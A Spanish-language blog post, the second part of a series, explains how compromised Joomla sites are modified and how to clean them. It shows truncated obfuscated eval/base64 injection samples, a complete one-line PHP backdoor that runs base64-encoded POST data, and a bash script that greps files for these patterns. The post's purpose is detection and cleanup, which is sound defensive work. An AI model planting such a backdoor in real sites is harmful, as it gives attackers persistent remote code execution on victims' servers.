---
title: Como es atacado un sistema Joomla (2º Parte)
date: 2012-06-18
description: Descubre cómo los atacantes comprometen sitios Joomla, los métodos utilizados para modificar archivos críticos y cómo proteger tu sitio eliminando código malicioso y reforzando la seguridad.
author: Francisco Javier Félix Belmonte
image: '/images/blog/post/como-es-atacado-un-joomla-2-parte.webp'
category: 'blog'
tags: [joomla, ataques, cms]
isDraft: false
---

Si en la [1º parte](Guias/Como-es-atacado-un-Joomla.html) explicamos cuáles son los métodos de ataque de un **CMS** tipo Joomla o Wordpress, ahora comentaremos de qué forma es modificado el Joomla y cómo podemos limpiarlo.

Normalmente los ficheros que se modifican primero son el `index.php`, pero en Joomla también son modificados:

```bash
/index.php
/includes/framework.php
/templates/xxxx/index.php
```

> Donde `xxxx` es el nombre de la plantilla que estamos usando.

Lo primero que tenemos que hacer es buscar en dichos ficheros, tanto al principio como al final, las siguientes sintaxis:

```javascript
eval(gzinflate(base64_decode('HJ3HbuvIFkU/5zXAAXMaMkcxi2nywJxz5te33IML+BqwJFbV2XstWZKLM+n/qd5mLPtkL/5Jk60gsP/nRT.......akxUhgBILEQ1AACIJo8Z9///79938=')));
eval(@gzinflate(base64_decode('HJ3HbuvIFkU/5zXAAXMaMkcxi2nywJxz5te33IML+BqwJFbV2XstWZKLM+n/qd5mLPtkL/5Jk60gsP/nRT.......akxUhgBILEQ1AACIJo8Z9///79938=')));
preg_replace("/.+/e","\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28......hPLidw/nyu/lEf6Xcg24Mhg8Bqov4C'\x29\x29\x29\x3B",".");
```

Estas líneas han sido cortadas por los puntos suspensivos, normalmente tienen más de 1200 caracteres, pudiendo llegar a 24.000, lo que nos hace sospechar de que algo raro pasa.  
En una primera limpieza, borraríamos las líneas o sustituiríamos los ficheros modificados por los originales o la última copia no alterada.

Luego buscaríamos estos patrones en el resto de ficheros y también podemos buscar por fecha de modificación.

Hay que estar atento a los ficheros modificados, porque también pueden incluir una puerta trasera. Y aunque limpiemos los ficheros o activemos sistemas de seguridad como [**suhosin**](http://www.hardened-php.net/suhosin/index.html) o [**mod_security**](http://www.modsecurity.org/), hay que buscar este código y eliminarlo.  
(*suhosin permite limitar el uso de `eval`, pero se necesitan conocimientos porque se podría dejar de funcionar ciertas partes de nuestra web.*)

```php
<?php if ($_POST["php"]){eval(base64_decode($_POST["php"]));exit;} ?>
```

Este fragmento, con un simple `POST`, permite al atacante volver a infectarnos y es difícil de detectar en los registros del **Apache**.

Como ejemplo, he creado un pequeño script en **bash** para buscar ficheros infectados. Aunque pueden aparecer algunos falsos positivos, siempre es recomendable revisarlos manualmente:

```bash
#!/bin/bash

malware() {
    find -type f -iname *.$1 | while read file
    do
        a=$(awk 'length($0) > 1020' "$file" | grep -e "base64_decode\|preg_replace")
        if [ "$a" ]; then
            echo "$file"
        fi
        b=$(grep "\$_POST" "$file" | grep -i base64_decode | grep -i eval)
        if [ "$b" ]; then
            echo "$file"
        fi
    done
}

malware phtml
malware php
malware phps
malware php5
```